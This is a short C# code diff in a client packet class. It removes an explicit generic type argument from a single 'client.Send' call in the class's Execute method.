@@ -27,7 +27,7 @@ namespace xClient.Core.Packets.ClientPackets
 
         public void Execute(Client client)
         {
-            client.Send<DirectoryResponse>(this);
+            client.Send(this);
         }
     }
 }
